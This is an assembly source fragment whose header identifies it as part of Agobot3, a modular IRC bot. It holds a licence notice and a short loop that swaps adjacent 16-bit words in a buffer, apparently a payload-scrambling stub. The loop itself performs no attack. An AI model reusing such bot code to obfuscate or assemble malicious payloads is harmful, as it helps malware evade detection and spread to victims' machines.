; Agobot3 - a modular IRC bot for Win32 / Linux
; Copyright (c) 2004 Ago and the Agobot team
; All rights reserved.
; 
; This is private software, you may redistribute it under the terms of
; the APL(Ago's Private License) which follows:
;   
; Redistribution and use in binary forms, with or without modification,
; are permitted provided that the following conditions are met:
; 1. The name of the author may not be used to endorse or promote products
;    derived from this software without specific prior written permission.
; 2. The binary and source may not be sold and/or given away for free.
; 3. The licensee may only create binaries for his own usage, not for any
;    third parties.
; 4. The person using this sourcecode is a developer of said sourcecode.
; 
; Redistribution and use in source forms, with or without modification,
; are not permitted.
; 
; This license may be changed without prior notice.
; 
; THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
; IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
; OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
; IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
; NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
; THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

BITS 32											; 32bit addressing
ORG 0x0											; for relative jumps etc...

swap_loop:
	push ebx									; backup ebx
	mov bx, word [esi+edx]						; get word 1
	mov di, word [esi+edx+2]					; get word 2
	mov word [esi+edx], di						; store word 2 in word 1
	mov word [esi+edx+2], bx					; store word 1 in word 2
	pop ebx										; restore ebx
	add edx, 0x4								; increment edx by 4
	cmp edx, ecx								; compare
	jl swap_loop								; if(edx<ecx) swap_loop;
